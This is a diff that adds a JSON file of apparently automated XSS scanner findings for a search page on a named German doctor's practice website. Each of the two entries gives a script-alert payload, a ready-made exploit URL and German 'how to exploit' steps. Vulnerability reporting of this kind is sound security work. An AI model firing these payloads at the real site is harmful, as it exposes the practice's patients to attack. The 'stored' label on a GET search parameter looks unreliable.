@@ -1,0 +1,28 @@
+[
+  {
+    "id": "lAP7xdhob4um",
+    "url": "https://hausarztpraxis-mehner.de/search.php",
+    "parameter": "q70",
+    "method": "GET",
+    "payload": "<script>alert('lAP7xdhob4um')</script>",
+    "type": "stored_xss",
+    "severity": "medium",
+    "debug_url": "https://hausarztpraxis-mehner.de/search.php?q70=%3Cscript%3Ealert%28%27lAP7xdhob4um%27%29%3C/script%3E",
+    "screenshot": "./dom_xss/screenshots/xss_20250331_074740_lAP7xdhob4um.png",
+    "description": "Persistente (Stored) Cross-Site-Scripting (XSS) Schwachstelle gefunden. Diese Schwachstelle erm\u00f6glicht es Angreifern, b\u00f6sartigen JavaScript-Code dauerhaft in der Datenbank der Webseite zu speichern, der bei jedem Aufruf der betroffenen Seite im Browser aller Besucher ausgef\u00fchrt wird.",
+    "how_to_exploit": "Um diese Schwachstelle auszunutzen, senden Sie den Parameter 'q70' mit dem Payload '<script>alert('lAP7xdhob4um')</script>' an die URL. Der Code wird in der Datenbank gespeichert und bei jedem Aufruf der Seite ausgef\u00fchrt. Besonders gef\u00e4hrlich, da alle Besucher betroffen sind."
+  },
+  {
+    "id": "q8nVQ6GIJf2j",
+    "url": "https://hausarztpraxis-mehner.de/search.php",
+    "parameter": "q140",
+    "method": "GET",
+    "payload": "<script>alert('q8nVQ6GIJf2j')</script>",
+    "type": "reflected_xss",
+    "severity": "low",
+    "debug_url": "https://hausarztpraxis-mehner.de/search.php?q140=%3Cscript%3Ealert%28%27q8nVQ6GIJf2j%27%29%3C/script%3E",
+    "screenshot": "./dom_xss/screenshots/xss_20250331_074740_q8nVQ6GIJf2j.png",
+    "description": "Reflektierte Cross-Site-Scripting (XSS) Schwachstelle gefunden. Diese Schwachstelle erm\u00f6glicht es Angreifern, b\u00f6sartigen JavaScript-Code in die Webseite einzuschleusen, der im Browser des Opfers ausgef\u00fchrt wird.",
+    "how_to_exploit": "Um diese Schwachstelle auszunutzen, senden Sie den Parameter 'q140' mit dem Payload '<script>alert('q8nVQ6GIJf2j')</script>' an die URL. Dies kann durch direkten Zugriff auf die Debug-URL oder durch Manipulation von Formulardaten erfolgen."
+  }
+]
